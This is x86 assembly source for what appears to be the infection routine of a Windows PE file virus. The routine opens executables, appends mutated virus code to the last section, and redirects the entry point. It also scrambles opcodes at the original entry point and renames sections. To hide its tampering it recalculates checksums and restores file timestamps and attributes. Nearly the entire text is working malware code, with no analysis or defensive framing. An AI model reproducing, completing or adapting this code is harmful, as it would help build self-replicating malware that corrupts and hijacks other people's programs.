
IX_TIMESIGN             equ     00000001h ; time-signature found (alredy)
IX_TIMEUSED             equ     00000002h ; considerable timeslice used
IX_INFECTED             equ     00000004h ; file infected

 ; input:  EDX=file name
 ; output: EAX=exitcode (bitset of IX_xxx)

infect_exe_file         proc    pascal
                        local   mz:BYTE:size mz_struc
                        local   oe:BYTE:size oe_struc
                        local   pe:BYTE:size pe_struc
                        local   last_oe_offs
                        local   perv_offs
                        local   fx:BYTE:size ff_struc
                        local   fn
                        local   headersum
                        pusha

                        fake

                        debugmsg infectexe, edx

                        mov     dword ptr [esp+7*4], 0
                        mov     fn, edx

                        lea     eax, fx
                        push    eax
                        push    edx
                        call    xxFindFirstFileA
                        xchg    esi, eax
                        push    esi
                        call    xxFindClose
                        inc     esi     ; INVALID_HANDLE_VALUE?
                        jnz     __skip7
                        debugmsg errfind, fn
                        jmp     __exit
__skip7:

                        downgrade __skiptimechk

                        or      dword ptr [esp+7*4], IX_TIMESIGN

                        lea     edx, fx.ff_time_lastwrite + 4
                        push    4
                        pop     ecx
                        mov     eax, ecx
                        call    xcrc32
                        cmp     fx.ff_time_lastwrite.byte ptr 3, al
                        jne     __skip2
                        debugmsg alredytime
                        jmp     __exit
__skip2:                mov     fx.ff_time_lastwrite.byte ptr 3, al

                        and     dword ptr [esp+7*4], not IX_TIMESIGN
__skiptimechk:

                        debugskip askinfect, __exit

                        lea     esi, pe
                        lea     edi, oe

                        mov     edx, fn

                        push    20h
                        pop     ecx
                        cmp     fx.ff_attr, ecx
                        je      __skipset1
                        call    fsetattr
                        jc      __erropen_exit
__skipset1:

                        call    fopen_rw
                        jc      __erropen_exit
                        xchg    ebx, eax

                        lea     edx, mz
                        mov     ecx, size mz_struc
                        call    fread
                        cmp     eax, ecx
                        jne     __close

                        fake

                        mov     eax, dword ptr [edx].mz_id
                        not     eax
                        mul     ah
                        cmp     ax, 72BAh       ; both 'MZ'&'ZM'
                        jnz     __close

                        mov     edx, mz.mz_neptr
                        call    fseek

                        mov     edx, esi
                        mov     ecx, size pe_struc
                        call    fread
                        cmp     eax, ecx
                        jne     __close

                        mov     eax, [esi].pe_id
                        imul    eax, 7
                        cmp     eax, 'EP'*7
                        jne     __close

                        test    [esi].pe_exeflags, 2000h ; dll?
                        jne     __close
                        or      [esi].pe_exeflags, 0001h ; strip relocs

                        xor     eax, eax
                        cmp     [esi].pe_entrypointrva, eax
                        je      __close

                        lea     edx, [esi].pe_id
                        mov     ecx, pe_linkminor
                        mov     eax, [esi].pe_imagebase
                        call    xcrc32
                        sub     al, ah
                        shr     al, 3
                        inc     eax

                        fake

                        cmp     [esi].pe_linkminor, al  ; alredy processed?
                        jne     __skip1
                        debugmsg alredysign
                        jmp     __close
__skip1:                mov     [esi].pe_linkminor, al

                        downgrade __skipprv
                        call    pervert
__skipprv:

                        xor     eax, eax
                        mov     [esi].pe_checksum, eax
                        mov     [esi].pe_fixuptablerva, eax
                        mov     [esi].pe_fixuptablesize, eax

                        fake

                        movzx   ecx, [esi].pe_numofobjects
                        dec     ecx
                        imul    ecx, size oe_struc
                        mov     edx, mz.mz_neptr
                        add     edx, pe_ntheader_id-pe_id ; +18h
                        movzx   eax, [esi].pe_ntheadersize
                        add     edx, eax
                        add     edx, ecx
                        mov     last_oe_offs, edx
                        call    fseek

                        mov     edx, edi
                        mov     ecx, size oe_struc
                        call    fread

                        xor     eax, eax
                        cmp     [edi].oe_virt_size, eax
                        je      __close
                        cmp     [edi].oe_phys_size, eax
                        je      __close

                        fake

                        mov     ecx, [esi].pe_filealign
                        dec     ecx
                        add     [edi].oe_phys_size, ecx
                        not     ecx
                        and     [edi].oe_phys_size, ecx

                        mov     ecx, [esi].pe_objectalign
                        dec     ecx
                        add     [edi].oe_virt_size, ecx
                        not     ecx
                        and     [edi].oe_virt_size, ecx

                        mov     eax, [edi].oe_phys_offs ; check overlay
                        add     eax, [edi].oe_phys_size
                        sub     eax, fx.ff_size
                        neg     eax
                        cmp     eax, 4096
                        jb      __ok1
                        debugmsg haveovr
                        jmp     __close
__ok1:

                        fake

                        downgrade __skiprename

 ; .rsrc & .reloc -- to be renamed randomly
                        lea     edx, [edi].oe_name
                        mov     eax, [edx]
                        not     eax
                        cmp     eax, not 'rsr.'
                        je      __1
                        cmp     eax, not 'ler.'
                        jne     __3
__1:
                        rnd     10
                        jz      __3

                        mov     dword ptr [edx+4],0
                        rnd     3
                        add     eax, 3
                        push    eax
__2:                    inc     edx
                        rnd     26
                        add     al, 'a'
                        mov     [edx], al
                        dec     dword ptr [esp]
                        jnz     __2
                        pop     ecx
__3:
__skiprename:

                        mov     edx, [edi].oe_phys_offs
                        add     edx, [edi].oe_phys_size
                        call    fseek

                        fake

                        mov     eax, [esi].pe_entrypointrva
                        add     eax, [esi].pe_imagebase
                        mov     old_eip, eax

                        or      dword ptr [esp+7*4], IX_TIMEUSED

                        call    gen_copy
                        jc      __close

                        cmp     usermut_complete, 101 ; additional check
                        jne     __close

                        mov     eax, 4095
                        add     buf_size, eax
                        not     eax
                        and     buf_size, eax

                        mov     eax, [edi].oe_phys_size
                        add     eax, [edi].oe_virt_rva
                        add     eax, buf_entry
                        mov     [esi].pe_entrypointrva, eax
                        mov     eax, buf_size
                        add     [edi].oe_phys_size, eax
                        add     [edi].oe_virt_size, eax
                        add     [esi].pe_sizeofcode, eax
                        add     [esi].pe_imagesize, eax

                        add     [esi].pe_stackreservesize, GROWSTACK
                        add     [esi].pe_heapreservesize, GROWHEAP

                     ;  mov     eax, fucking_stack
                     ;  mov     [esi+44h], eax

                        mov     eax, buf_size
                        neg     eax
                        ror     eax, 23
                        mov     [edi].oe_xxx, eax

                        mov     ecx, buf_size
                        mov     edx, buf_ptr
                        call    fwrite
                        jc      __close

                        fake

                        debugmsg somewrite, edx

                        mov     edx, mz.mz_neptr
                        call    fseek

                        mov     edx, esi
                        mov     ecx, size pe_struc
                        call    fwrite
                        jc      __close

                        fake

                        mov     edx, last_oe_offs
                        call    fseek

                        mov     edx, edi
                        mov     ecx, size oe_struc
                        call    fwrite
                        jc      __close

                        call    __upd_time

                        or      dword ptr [esp+7*4], IX_INFECTED

                        debugmsg infectok

                        fake

__close:                call    fclose

                        ;;

                        downgrade __skipcsum

                        test    dword ptr [esp+7*4], IX_INFECTED
                        jz      __skipcsum

                        x_push  ecx, IMAGEHLP.DLL~

                        push    esp
                        call    xxLoadLibraryA

                        x_pop

                        or      eax, eax
                        jz      __skipcsum

                        x_push  ecx, MapFileAndCheckSumA~

                        push    esp      ;
                        push    eax
                        call    xxGetProcAddress

                        x_pop

                        or      eax, eax
                        jz      __skipcsum

                        lea     ecx, pe.pe_checksum
                        push    ecx
                        lea     ecx, headersum
                        push    ecx
                        push    fn      ; ptr to filename
                        call    eax
                        or      eax, eax
                        jnz     __skipcsum
                        mov     edx, fn

                        call    fopen_rw
                        jc      __skipcsum
                        xchg    ebx, eax
                        mov     edx, mz.mz_neptr
                        call    fseek
                        lea     edx, pe
                        mov     ecx, size pe_struc
                        call    fwrite
                        call    __upd_time
                        call    fclose

                        debugmsg csum
__skipcsum:
                        ;;

                        mov     ecx, fx.ff_attr
                        cmp     ecx, 20h
                        je      __skipset2
                        mov     edx, fn
                        call    fsetattr
__skipset2:


__exit:                 popa
                        ret

__erropen_exit:         debugmsg erropen
                        jmp     __exit

; - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

__upd_time:             pusha
                        lea     eax, fx.ff_time_lastwrite
                        push    eax
                        push    eax  ; last-acc
                        push    0    ; create
                        push    ebx
                        call    xxSetFileTime
                        popa
                        retn

; - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

PERVERT_SIZE            equ     512

pervert:                pusha

                        mov     edx, mz.mz_neptr
                        add     edx, pe_ntheader_id-pe_id ; +18h
                        movzx   eax, [esi].pe_ntheadersize
                        add     edx, eax
                        call    fseek    ; seek offset(objecttable)

                        movzx   ecx, [esi].pe_numofobjects
                        or      ecx, ecx
                        jz      __close

__cycle:                mov     edx, edi
                        mov     ecx, size oe_struc
                        call    fread

                        mov     edx, [esi].pe_entrypointrva
                        sub     edx, [edi].oe_virt_rva
                        cmp     edx, [edi].oe_phys_size
                        jb      __found

                        loop    __cycle

                        ; EIP not found -- check if EIP in header ;-)
                        mov     edx, [esi].pe_entrypointrva
                        cmp     edx, [esi].pe_headersize
                        jbe     __found2

                        jmp     __exitprv

__found:                add     edx, [edi].oe_phys_offs

__found2:               mov     perv_offs, edx
                        call    fseek   ; seek RVA2OFS(EntryPointRVA)

                        mov     edx, tmp_ptr
                        mov     ecx, PERVERT_SIZE
                        call    fread
                        cmp     eax, ecx
                        jne     __exitprv

                        mov     edx, tmp_ptr
;                       mov     ecx, PERVERT_SIZE
                        call    pervert_buf

                        mov     edx, perv_offs
                        call    fseek

                        mov     edx, tmp_ptr
;                       mov     ecx, PERVERT_SIZE
                        call    fwrite

__exitprv:              popa
                        retn

pervert_buf:            pusha

                        debugmsg perv, ecx

                        push    offset ldetbl       ; initialize disassembler
                        call    disasm_init

                        lea     esi, [edx+ecx-32]   ; esi=lastbyte

__pervcycle:            mov     ecx, [edx]          ; get curr. opcode

                        or      cx, cx              ; exit if 00 00
                        je      __exitpervcycle
                        cmp     cx, 25FFh           ; exit if jmp
                        je      __exitpervcycle
                        cmp     cl, 0E9h
                        je      __exitpervcycle
                        cmp     cl, 0EBh
                        je      __exitpervcycle
                        cmp     cl, 0F6H            ; ret#/ret/retf#/retf
                        cmp     cl, 0C2h            ; c2/c3/ca/cb
                        je      __exitpervcycle

                        call    pervert_opcode      ; pervert opcode
                        mov     [edx], ecx

                        push    edx             ; get opcode length (in EAX)
                        push    offset ldetbl
                        call    disasm_main
                        cmp     eax, -1         ; cant disasm?
                        je      __exitpervcycle

                        add     edx, eax        ; go to next opcode

                        cmp     edx, esi
                        jb      __pervcycle
__exitpervcycle:

                        popa
                        retn

                        endp ; infect_exe_file
